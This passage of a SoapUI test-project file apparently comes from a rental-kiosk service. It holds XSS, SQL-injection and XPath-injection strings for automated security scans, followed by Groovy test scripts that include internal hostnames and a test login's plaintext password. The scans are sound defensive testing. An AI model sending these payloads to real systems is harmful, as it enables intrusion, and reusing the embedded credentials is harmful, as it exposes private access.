DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;"></BODY></HTML>]]></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT SRC="http://soapui.org/xss.jpg">&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;? echo('&lt;SCR)';echo('IPT>alert("XSS")&lt;/SCRIPT>'); ?></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC="http://soapui.org/somecommand.php?somevariables=maliciouscode"></con:parameterExposureStrings><con:parameterExposureStrings>Redirect 302 /a.jpg http://soapui.org/admin.asp&amp;deleteuser</con:parameterExposureStrings><con:parameterExposureStrings>&lt;META HTTP-EQUIV="Set-Cookie" Content="USERID=&amp;lt;SCRIPT&amp;gt;alert('XSS')&amp;lt;/SCRIPT&amp;gt;"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;HEAD>&lt;META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> &lt;/HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-</con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT a=">" SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT =">" SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT a=">" '' SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT "a='>'" SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT a=`>` SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT a=">'>" SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT>document.write("&lt;SCRI");&lt;/SCRIPT>PT SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings></con:config><con:assertion type="Sensitive Information Exposure" id="a2df8c1f-81dd-4dee-b4e9-bff794f60421" name="Sensitive Information Exposure"><con:configuration/></con:assertion><con:assertion type="CrosSiteScript" id="42ab7779-0eef-4269-ad1c-0af835a9feaf" name="Cross Site Scripting Detection"><con:configuration/></con:assertion><con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/><con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:parameters label="Request" parameterName="Request" xpath="" checked="true"/></con:checkedParameters><con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:strategy>ONE_BY_ONE</con:strategy><con:delay>100</con:delay></con:executionStrategy></con:testStepSecurityScan><con:testStepSecurityScan type="FuzzingScan" name="Fuzzing Scan" id="96db5c84-ca40-4c31-afdc-857272298944" applyForFailedStep="false" disabled="false" runOnlyOnce="true"><con:settings/><con:config xsi:type="con:FuzzerScan" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:minimal>5</con:minimal><con:maximal>15</con:maximal><con:numberOfRequest>100</con:numberOfRequest></con:config><con:assertion type="Sensitive Information Exposure" id="f6200f72-1e29-4489-ac8c-a3fd7d5c99c6" name="Sensitive Information Exposure"><con:configuration/></con:assertion><con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/><con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:parameters label="Request" parameterName="Request" xpath="" checked="true"/></con:checkedParameters><con:executionStrategy xsi:nil="true" immutable="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:strategy>ALL_AT_ONCE</con:strategy><con:delay>100</con:delay></con:executionStrategy></con:testStepSecurityScan><con:testStepSecurityScan type="SQLInjectionScan" name="SQL Injection" id="9b158cda-1bbf-4143-a340-b9fb0965529f" applyForFailedStep="false" disabled="false" runOnlyOnce="true"><con:settings/><con:config xsi:type="con:SQLInjectionScan" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:sqlInjectionStrings>' or '1'='1</con:sqlInjectionStrings><con:sqlInjectionStrings>'--</con:sqlInjectionStrings><con:sqlInjectionStrings>1'</con:sqlInjectionStrings><con:sqlInjectionStrings>admin'--</con:sqlInjectionStrings><con:sqlInjectionStrings>/*!10000%201/0%20*/</con:sqlInjectionStrings><con:sqlInjectionStrings>/*!10000 1/0 */</con:sqlInjectionStrings><con:sqlInjectionStrings>1/0</con:sqlInjectionStrings><con:sqlInjectionStrings>'%20o/**/r%201/0%20--</con:sqlInjectionStrings><con:sqlInjectionStrings>' o/**/r 1/0 --</con:sqlInjectionStrings><con:sqlInjectionStrings>;</con:sqlInjectionStrings><con:sqlInjectionStrings>'%20and%201=2%20--</con:sqlInjectionStrings><con:sqlInjectionStrings>' and 1=2 --</con:sqlInjectionStrings><con:sqlInjectionStrings>test�%20UNION%20select%201,%20@@version,%201,%201;�</con:sqlInjectionStrings><con:sqlInjectionStrings>test� UNION select 1, @@version, 1, 1;�</con:sqlInjectionStrings></con:config><con:assertion type="Sensitive Information Exposure" id="02a1dfe4-dfd8-4cd4-a190-402e5982257d" name="Sensitive Information Exposure"><con:configuration/></con:assertion><con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/><con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:parameters label="Request" parameterName="Request" xpath="" checked="true"/></con:checkedParameters><con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:strategy>ONE_BY_ONE</con:strategy><con:delay>100</con:delay></con:executionStrategy></con:testStepSecurityScan><con:testStepSecurityScan type="XPathInjectionSecurityScan" name="XPath Injection" id="fa310f6b-06c8-41b8-ad61-eeb3f814b0cf" applyForFailedStep="false" disabled="false" runOnlyOnce="true"><con:settings/><con:config xsi:type="con:XPathInjection" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:xpathList> or name(//users/LoginID[1]) = 'LoginID' or 'a'='b</con:xpathList><con:xpathList>' or '1'='1</con:xpathList><con:xpathList>1/0</con:xpathList><con:xpathList>'%20o/**/r%201/0%20--</con:xpathList><con:xpathList>' o/**/r 1/0 --</con:xpathList><con:xpathList>;</con:xpathList><con:xpathList>'%20and%201=2%20--</con:xpathList><con:xpathList>' and 1=2 --</con:xpathList><con:xpathList>test�%20UNION%20select%201,%20@@version,%201,%201;�</con:xpathList><con:xpathList>test� UNION select 1, @@version, 1, 1;�</con:xpathList></con:config><con:assertion type="Sensitive Information Exposure" id="a5bb032c-56b2-4aa3-80de-f31056d87805" name="Sensitive Information Exposure"><con:configuration/></con:assertion><con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/><con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:parameters label="Request" parameterName="Request" xpath="" checked="true"/></con:checkedParameters><con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:strategy>ONE_BY_ONE</con:strategy><con:delay>100</con:delay></con:executionStrategy></con:testStepSecurityScan><con:testStepSecurityProScan type="HttpMethodFuzzingScan" name="HTTP Method Fuzzing" id="a6e88aae-f3ef-48d5-9b49-f6b5faa202e2" applyForFailedStep="false" disabled="false" runOnlyOnce="true"><con:settings/><con:config xsi:type="con:HttpMethodFuzzingScan" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:deselectedMethods/></con:config><con:assertion type="Sensitive Information Exposure" id="7e3869de-7588-420a-bf32-eaaaad1369c3" name="Sensitive Information Exposure"><con:configuration/></con:assertion><con:assertion type="Valid HTTP Status Codes" id="899ebbb5-4332-40f7-8685-cb6482170c15" name="Valid HTTP Status Codes"><con:settings><con:setting id="__LEVEL_">WARNING</con:setting></con:settings><con:configuration><codes>501,405,403</codes></con:configuration></con:assertion><con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/><con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/><con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:strategy>ONE_BY_ONE</con:strategy><con:delay>100</con:delay></con:executionStrategy></con:testStepSecurityProScan><con:testStepSecurityProScan type="WeakAuthenticationScan" name="Weak Authentication" id="2dbe87de-9a61-4c06-8115-8d042274cfed" applyForFailedStep="false" disabled="false" runOnlyOnce="true"><con:settings/><con:config xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/><con:assertion type="WeakPassword" id="8cff33d7-7147-4ffe-aac4-23d26f89e4fa" name="Weak Password Detection"><con:configuration/></con:assertion><con:assertion type="BasicAuth" id="c4d925a2-0640-4a12-bd67-3ae5b51df280" name="Basic Authentication Detection"/><con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/><con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/><con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:strategy>ONE_BY_ONE</con:strategy><con:delay>100</con:delay></con:executionStrategy></con:testStepSecurityProScan></con:testStepSecurityTest><con:properties/><con:reportParameters/></con:securityTest><con:breakPoints><con:testStepId>11df6ba2-fdef-4009-8b25-fefd7880344c</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>28e3f959-7d7b-4430-b733-48889066815d</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>79f4ddeb-559a-47cc-ad73-f820e14e740a</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>4fe2549a-b8da-434b-9bec-8fe0fd3b3b01</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>8ff1798e-1cb3-423f-8431-fb0ed5b04118</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>b4c3ce41-f3b6-4fd7-a8b6-d30b57672257</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>5200eef5-be3e-453d-8bc0-1b8784b1f7d2</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>854d46d3-f60f-4ce2-9ab5-cb83fda93192</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints></con:testCase><con:testCase id="ffd5fd53-74dd-462e-82fa-4749f92b345b" discardOkResults="true" failOnError="true" failTestCaseOnErrors="true" keepSession="false" name="Exception Return Rental Disc" searchProperties="true" timeout="0" maxResults="0"><con:settings/><con:testStep type="groovy" name="Run SetDaysBack" id="84fdc57d-27e8-4620-98d9-6289760a50a0"><con:settings/><con:config><script>import com.eviware.soapui.model.testsuite.TestRunner.Status;
def TransactionID = context.expand('${#TestCase#TransactionID}');
def SetDaysBack = context.expand('${#TestCase#SetDaysBack}');
def CustomerProfileNumber = context.expand('${#TestCase#CustomerProfileNumber}');
def Barcode = context.expand('${#TestCase#Barcode}');
//Define the Db Connection
import groovy.sql.*;
// Below line will create an object of the already created JDBC connection.
def ConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('RedboxServerDB');
def constring = ConObj.getConnectionString();
//Define the Connection
def sql = Sql.newInstance(constring);

if ((SetDaysBack == '0') || (SetDaysBack == ''))
{
	log.info ("SetDaysBack: $SetDaysBack; No need to run SetDaysBack Job for TransactionID:$TransactionID &amp; Barcode:[$Barcode]");
}
else
{
	log.info ("SetDaysBack: $SetDaysBack; Ran SetDaysBack Job for TransactionID: $TransactionID &amp; Barcode:[$Barcode]");
	sql.execute("exec [dbo].[AutomationSetTransIDCPNumber] $TransactionID,$SetDaysBack,$CustomerProfileNumber");
	
}

//Wait For Collector
def getExtraNightsInfo = sql.firstRow("SELECT DATEDIFF (dd, Rent_Date, GETDATE ()) AS Days FROM	[Transaction] WHERE Transaction_ID = $TransactionID");

def numOfDays = getExtraNightsInfo.Days;
log.info ("numOfDays:$numOfDays")
if (numOfDays.toInteger() > 15)
{
	def Integer ConfigIntervalTime = 30000;
	log.info("Non Returns - Waiting for configured time ie: $ConfigIntervalTime milliSeconds");
	sleep(ConfigIntervalTime);
	testRunner.testCase.setPropertyValue("LabelToCheck", "3")
}
else 
{
     log.info("No Non Returns");
     testRunner.testCase.setPropertyValue("LabelToCheck", "2")
}</script></con:config></con:testStep><con:testStep type="groovy" name="Encode Message Body (Return)" id="72eda979-4e17-4f94-9f73-dfe22909905e"><con:settings/><con:config><script>def KioskID = context.expand( '${#TestCase#KioskID}');
def Barcode = context.expand( '${#TestCase#Barcode}');
def DiscID = context.expand( '${#TestCase#DiscID}');
def ReturnType = context.expand( '${#TestCase#ReturnType}');
def TransactionID = context.expand( '${#TestCase#TransactionID}');

def MessageId = UUID.randomUUID().toString();
calendar = Calendar.getInstance();
def theDate = (621355968000000000 +calendar.getTimeInMillis()*10000).toString();
def dateString = (new Date().format("yyyy-MM-dd'T'HH:mm:ss.SSSSSSS"));

requestPayload = "";
//Build Reconcile Request
requestPayload += "{";
requestPayload += "\"DiskId\": \"$DiscID\",";
requestPayload += "\"KioskId\": $KioskID,";
requestPayload += "\"TransactionId\": \"$TransactionID\",";
requestPayload += "\"ReturnDate\": \"$dateString\",";
requestPayload += "\"UserId\": \"Kiosk-Automation\"";
requestPayload += "}";

// log to soapui log
log.info("ReturnPayload: $requestPayload");

// url encode json string
result = "payload=" + URLEncoder.encode(requestPayload)
testRunner.testCase.setPropertyValue("RequestBody",requestPayload)</script></con:config></con:testStep><con:testStep type="httprequest" name="ExceptionReturn (Request)" id="d4f1f081-efdd-43a8-8820-7846de7382fc"><con:settings/><con:config method="POST" xsi:type="con:HttpRequest" id="6f202535-807d-476e-9579-0ccb24d77caa" name="ExceptionReturn (Request)" postQueryString="false" mediaType="application/json" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:settings><con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;xml-fragment/></con:setting></con:settings><con:endpoint>http://qamerch04.rb.local/CorporateServiceGC/api/Operations/ExceptionReturn</con:endpoint><con:request>${#TestCase#RequestBody}</con:request><con:assertion type="GroovyScriptAssertion" id="08daa94a-0e60-4f34-8460-78f437522ac4" name="Check for Success and HasErrors"><con:configuration><scriptText>def response = messageExchange.getResponseContent()
log.info ("ExceptionReturn Response: $response")
assert response.contains("\"Success\":true,")
assert response.contains("\"Errors\":[]")</scriptText></con:configuration></con:assertion><con:credentials><con:selectedAuthProfile>No Authorization</con:selectedAuthProfile><con:authType>No Authorization</con:authType></con:credentials><con:jmsConfig JMSDeliveryMode="PERSISTENT"/><con:parameters/><con:environmentSpec><con:entry environmentId="088f2c6b-5bf5-4b7a-aea1-4ebec9f3aa3a"><con:authProfile>No Authorization</con:authProfile></con:entry><con:entry environmentId="bff3f14b-e680-473b-bba1-89a50bc86a72"><con:authProfile>No Authorization</con:authProfile></con:entry></con:environmentSpec></con:config></con:testStep><con:testStep type="jdbc" name="Check Disc Status" id="2170b942-1513-4f6a-9543-cca721118f1f"><con:settings><con:setting id="prettyPrintResponse">true</con:setting></con:settings><con:config xsi:type="con:JdbcRequestTestStep" convertColumnNamesToUpperCase="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dbConnectionName>RedboxServerDB</con:dbConnectionName><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB100.rb.local:1433;databaseName=RedboxServerDB;integratedSecurity=true;</con:connectionString><con:password>t</con:password><con:connectionProperties/><con:query>SELECT
	d.Physical_Status,
	d.IsFraud,
	d.Merchand_Status,
	d.Thin_Reason_Code,
	d.Thin_Date,
	t.FormatId
FROM 
	Disc(nolock) d
Inner Join Title t On t.Title_ID = d.Title_ID
WHERE
	d.RF_ID = :RFID</con:query><con:assertion type="GroovyScriptAssertion" id="f0ac0568-e2ed-4a41-a2fb-d4a78628cdad" name="Script Assertion"><con:configuration><scriptText>def groovyUtils = new com.eviware.soapui.support.GroovyUtils( context);
def discholder = groovyUtils.getXmlHolder("Check Disc Status#ResponseAsXml");
def actualPhysicalStatus = discholder.getNodeValue("//Results[1]/ResultSet[1]/Row[1]/PHYSICAL_STATUS[1]");
//log.info ("actualPhysicalStatus :$actualPhysicalStatus")

def formatId = discholder.getNodeValue("//Results[1]/ResultSet[1]/Row[1]/FORMATID[1]");

assert (actualPhysicalStatus = '2');</scriptText></con:configuration></con:assertion><con:properties><con:property><con:name>RFID</con:name><con:value>${#TestCase#Barcode}</con:value></con:property></con:properties></con:config></con:testStep><con:testStep type="jdbc" name="Check Disc Transaction" id="8d391588-ab2b-4de3-9d5b-4ce7c13d0cc2"><con:settings><con:setting id="prettyPrintResponse">true</con:setting></con:settings><con:config xsi:type="con:JdbcRequestTestStep" convertColumnNamesToUpperCase="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dbConnectionName>RedboxServerDB</con:dbConnectionName><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB100.rb.local:1433;databaseName=RedboxServerDB;integratedSecurity=true;</con:connectionString><con:password>t</con:password><con:connectionProperties/><con:query>SELECT
	Return_Date, Return_Client, DaysCharged, DiscTransaction_Status
FROM 
	Disc_Transaction(nolock)
WHERE
	Disc_ID = (select disc_id from disc where RF_ID = :RFID and KioskClient_ID = :KioskId)
and
	transaction_id = :TnxID</con:query><con:assertion type="GroovyScriptAssertion" id="48cf2372-b66f-464f-b19a-61b8729fc1e5" name="DiscTransactionStatus-Validations"><con:configuration><scriptText>def groovyUtils = new com.eviware.soapui.support.GroovyUtils( context );
def discholder = groovyUtils.getXmlHolder("Check Disc Transaction#ResponseAsXml");
def discTnxStatus = discholder.getNodeValue("//Results[1]/ResultSet[1]/Row[1]/DISCTRANSACTION_STATUS[1]");
def returnDate = discholder.getNodeValue("//Results[1]/ResultSet[1]/Row[1]/RETURN_DATE[1]");
def returnType = context.expand( '${#TestCase#ReturnType}' );
log.info("Return Date = $returnDate;Disc Transaction Status = $discTnxStatus")
//Validations
//if(!returnDate.toString().equals("&lt;RETURN_DATE/>"))
if(!returnDate.toString().equals('null'))
{
	if (returnType == '11')
	{
		//Game Fraud Return
		assert discTnxStatus =='4'
	}
	else
	{
		// returned
		assert discTnxStatus =='3'
	}		
}
else
{
	//unreturned
	assert discTnxStatus=='4'
}
</scriptText></con:configuration></con:assertion><con:properties><con:property><con:name>RFID</con:name><con:value>${#TestCase#Barcode}</con:value></con:property><con:property><con:name>KioskId</con:name><con:value>${#TestCase#KioskID}</con:value></con:property><con:property><con:name>TnxID</con:name><con:value>${#TestCase#TransactionID}</con:value></con:property></con:properties></con:config></con:testStep><con:testStep type="jdbc" name="Check Invoice Details" id="82ede5a9-86c3-428b-aae0-b9146e33c21f"><con:settings><con:setting id="prettyPrintResponse">true</con:setting></con:settings><con:config xsi:type="con:JdbcRequestTestStep" convertColumnNamesToUpperCase="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dbConnectionName>MerchantService</con:dbConnectionName><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB102.rb.local:1433;databaseName=MerchantService;integratedSecurity=true</con:connectionString><con:password>tes</con:password><con:connectionProperties/><con:query>SELECT top 1 
	i.[Status] AS INVSTATUS,
	ii.[Status] AS INVITEMSTATUS
FROM 
	InvoiceItem ii
INNER JOIN 
	Invoice i
ON 
	i.OID = ii.Invoice
WHERE 
	i.ReferenceNumber = :tnxID
ORDER BY 
	ii.OID DESC</con:query><con:assertion type="GroovyScriptAssertion" id="7747ebe4-283d-4239-8657-3cc084019dc4" name="Invoice and InvoiceItem"><con:configuration><scriptText>def InvoiceID = context.expand( '${#TestCase#InvoiceID}' );
def CardType = context.expand( '${#TestCase#CardType}' ).toInteger();
def IsOffline = context.expand( '${#TestCase#IsOffline}' );
def groovyUtils = new com.eviware.soapui.support.GroovyUtils( context );
def discholder = groovyUtils.getXmlHolder("Check Disc Transaction#ResponseAsXml");
def DaysCharged = discholder.getNodeValue("//Results[1]/ResultSet[1]/Row[1]/DAYSCHARGED[1]").toInteger();
def invholder = groovyUtils.getXmlHolder( "Check Invoice Details#ResponseAsXml");
def actualInvoiceStatus = invholder.getNodeValue("//INVSTATUS[1]").toInteger();
def actualInvoiceItemStatus = invholder.getNodeValue("//INVITEMSTATUS[1]").toInteger();
def RentalCount = context.expand( '${#TestCase#RentalCount}' ).toInteger();
def PurchaseCount = context.expand( '${#TestCase#PurchaseCount}' ).toInteger();
//Define the Db Connection
import groovy.sql.*;
// Below line will create an object of the already created JDBC connection.
def ConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('MerchantService');
def constring = ConObj.getConnectionString();
//Define the Connection
def sql = Sql.newInstance(constring);
def getAmountInfo = sql.firstRow("SELECT sum(Quantity * amountbase ) as totalAmountBase FROM	[InvoiceItem] WHERE Invoice = $InvoiceID");
def getTnxAmount = getAmountInfo.totalAmountBase.toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);

if (IsOffline == 'false')
{
	if (getTnxAmount == 0)
	{
		assert (actualInvoiceStatus == 1);
	     assert (actualInvoiceItemStatus == 17);
	}
	else if (getTnxAmount > 0)
	{
		if (DaysCharged > 1)
		{
			assert (actualInvoiceStatus == 1);
	     	assert (actualInvoiceItemStatus == 6);
		}
		else
		{
			assert (actualInvoiceStatus == 1);
	     	assert (actualInvoiceItemStatus == 3);
		}
	}
}
else
{
	if (getTnxAmount == 0)
	{
		assert (actualInvoiceStatus == 4);
	     assert (actualInvoiceItemStatus == 16);
	}
	else if (getTnxAmount > 0)
	{
		assert (actualInvoiceStatus == 1);
     	assert (actualInvoiceItemStatus == 6);
	}
}</scriptText></con:configuration></con:assertion><con:properties><con:property><con:name>tnxID</con:name><con:value>${#TestCase#TransactionID}</con:value></con:property></con:properties></con:config></con:testStep><con:properties><con:property><con:name>Barcode</con:name><con:value>001505205</con:value></con:property><con:property><con:name>SetDaysBack</con:name><con:value>0</con:value></con:property><con:property><con:name>KioskID</con:name><con:value>1505</con:value></con:property><con:property><con:name>ReturnType</con:name><con:value>6</con:value></con:property><con:property><con:name>InvoiceID</con:name><con:value>2148721009</con:value></con:property><con:property><con:name>TransactionID</con:name><con:value>1655736</con:value></con:property><con:property><con:name>RequestBody</con:name><con:value>{"DiskId": "16336329","KioskId": 1505,"TransactionId": "1655736","ReturnDate": "2018-01-26T11:06:40.0000764","UserId": "Kiosk-Automation"}</con:value></con:property><con:property><con:name>CustomerProfileNumber</con:name><con:value>90855364928109</con:value></con:property><con:property><con:name>LabelToCheck</con:name><con:value>2</con:value></con:property><con:property><con:name>CardType</con:name><con:value>3</con:value></con:property><con:property><con:name>IsOffline</con:name><con:value>false</con:value></con:property><con:property><con:name>RentalCount</con:name><con:value>1</con:value></con:property><con:property><con:name>PurchaseCount</con:name><con:value>0</con:value></con:property><con:property><con:name>DiscID</con:name><con:value>16336329</con:value></con:property></con:properties><con:reportParameters/><con:breakPoints><con:testStepId>11df6ba2-fdef-4009-8b25-fefd7880344c</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>28e3f959-7d7b-4430-b733-48889066815d</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>79f4ddeb-559a-47cc-ad73-f820e14e740a</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>4fe2549a-b8da-434b-9bec-8fe0fd3b3b01</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints></con:testCase><con:testCase id="54ad0b2a-07ea-4cd6-9d4d-aff9b588f6a9" discardOkResults="true" failOnError="true" failTestCaseOnErrors="true" keepSession="false" name="KioskLogin(Email)" searchProperties="true" timeout="0" maxResults="0"><con:settings/><con:testStep type="groovy" name="LoginInfo" id="0a029c0c-3f2d-4497-b510-45b794ac2c9f"><con:settings/><con:config><script>def password = context.expand( '${#TestCase#Password}' );
def encryptPassword = "c:\\Temp\\EncryptPassword.exe $password".execute().text.replaceAll("\\s","");
//log.info ("[$encryptPassword]"); 
testRunner.testCase.setPropertyValue("EncryptedPassword",encryptPassword);</script></con:config></con:testStep><con:testStep type="groovy" name="Encode Message Body (KioskLogin)" id="70596a05-b05d-4bf8-b925-e37b7157163d"><con:settings/><con:config><script>import java.util.Date
import java.util.Calendar
import java.text.DecimalFormat;
import com.eviware.soapui.model.testsuite.TestRunner.Status;

requestPayload = "";
def EncryptedPassword = context.expand( '${#TestCase#EncryptedPassword}' );
def LoginEmailAddress = context.expand( '${#TestCase#LoginEmailAddress}' );
def KioskID = context.expand( '${#TestCase#KioskID}' );
def MessageId = UUID.randomUUID().toString();
calendar = Calendar.getInstance();
def theDate = (621355968000000000 +calendar.getTimeInMillis()*10000).toString();
def dateString = (new Date().format("yyyy-MM-dd'T'HH:mm:ss.SSSSSSS"));

//Build Reconcile Request
requestPayload += "{";
requestPayload += "\"MessageId\": \"$MessageId\",";
requestPayload += "\"KioskId\": $KioskID,";
requestPayload += "\"EngineVersion\": \"1.15.0.6\",";
requestPayload += "\"BundleVersion\": \"2.2.2.82\",";
requestPayload += "\"EmailAddress\": \"$LoginEmailAddress\",";
requestPayload += "\"Password\": \"$EncryptedPassword\",";
requestPayload += "\"IsOffline\": false,";
requestPayload += "\"LanguageCode\": \"es\",";
requestPayload += "\"MessageType\": \"KioskLogin\"";
requestPayload += "}";


// log to soapui log
log.info("KioskLogin Request: $requestPayload");

// url encode json string
result = "payload=" + URLEncoder.encode(requestPayload)
testRunner.testCase.setPropertyValue("RequestBody",result)
testRunner.testCase.setPropertyValue("KioskLoginGUID",MessageId.toString()); //For MessageControl Validations
</script></con:config></con:testStep><con:testStep type="httprequest" name="KioskLogin (Request)" id="b6056864-e199-411d-bbf4-94c731db793e"><con:settings/><con:config method="POST" xsi:type="con:HttpRequest" id="2f827cec-96de-4b99-b2fc-4153a6dfe7c0" name="KioskLogin (Request)" postQueryString="false" mediaType="application/x-www-form-urlencoded" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:settings><con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;xml-fragment/></con:setting></con:settings><con:endpoint>${#Project#KSEndpoint}</con:endpoint><con:request>${#TestCase#RequestBody}</con:request><con:assertion type="GroovyScriptAssertion" id="d00fe26d-b144-4dd6-8364-96f44b303ec1" name="Script Assertion"><con:configuration><scriptText>def response = URLDecoder.decode(messageExchange.getResponseContent())
log.info ("KioskLoginResponse: $response")</scriptText></con:configuration></con:assertion><con:credentials><con:selectedAuthProfile>No Authorization</con:selectedAuthProfile><con:authType>No Authorization</con:authType></con:credentials><con:jmsConfig JMSDeliveryMode="PERSISTENT"/><con:parameters/><con:environmentSpec><con:entry environmentId="088f2c6b-5bf5-4b7a-aea1-4ebec9f3aa3a"><con:authProfile>No Authorization</con:authProfile></con:entry><con:entry environmentId="bff3f14b-e680-473b-bba1-89a50bc86a72"><con:authProfile>No Authorization</con:authProfile></con:entry></con:environmentSpec></con:config></con:testStep><con:properties><con:property><con:name>Password</con:name><con:value>Testing1!</con:value></con:property><con:property><con:name>LoginEmailAddress</con:name><con:value>qa3.superstar@gmail.com</con:value></con:property><con:property><con:name>KioskID</con:name><con:value>1518</con:value></con:property><con:property><con:name>EncryptedPassword</con:name><con:value>eoTcpOsJ7ssr54ynfDbowQ==</con:value></con:property><con:property><con:name>RequestBody</con:name><con:value>payload=%7B%22MessageId%22%3A+%22a6982b33-3dd6-4cc7-8dce-78e40bee5113%22%2C%22KioskId%22%3A+1518%2C%22EngineVersion%22%3A+%221.15.0.6%22%2C%22BundleVersion%22%3A+%222.2.2.82%22%2C%22EmailAddress%22%3A+%22qa3.superstar%40gmail.com%22%2C%22Password%22%3A+%22eoTcpOsJ7ssr54ynfDbowQ%3D%3D%22%2C%22IsOffline%22%3A+false%2C%22LanguageCode%22%3A+%22es%22%2C%22MessageType%22%3A+%22KioskLogin%22%7D</con:value></con:property><con:property><con:name>KioskLoginGUID</con:name><con:value>a6982b33-3dd6-4cc7-8dce-78e40bee5113</con:value></con:property></con:properties><con:reportParameters/></con:testCase><con:testCase id="36958eca-2b63-4b1a-85ac-91630b7a7b0e" discardOkResults="true" failOnError="true" failTestCaseOnErrors="true" keepSession="false" name="KioskLogin(Phone)" searchProperties="true" timeout="0" maxResults="0"><con:settings/><con:testStep type="groovy" name="LoginInfo" id="2a6e83bf-4119-4d6f-967c-a08a047f2e4a"><con:settings/><con:config><script>def pin = context.expand( '${#TestCase#Pin}' );
def EncryptedPin = "c:\\Temp\\EncryptPassword.exe $pin".execute().text.replaceAll("\\s","");
//log.info ("[$encryptPassword]"); 
testRunner.testCase.setPropertyValue("EncryptedPin",EncryptedPin);</script></con:config></con:testStep><con:testStep type="groovy" name="Encode Message Body (KioskLogin)" id="5ccad144-d712-4393-ae80-03c5a5d736f9"><con:settings/><con:config><script>import java.util.Date
import java.util.Calendar
import java.text.DecimalFormat;
import com.eviware.soapui.model.testsuite.TestRunner.Status;

requestPayload = "";
def EncryptedPin = context.expand( '${#TestCase#EncryptedPin}' );
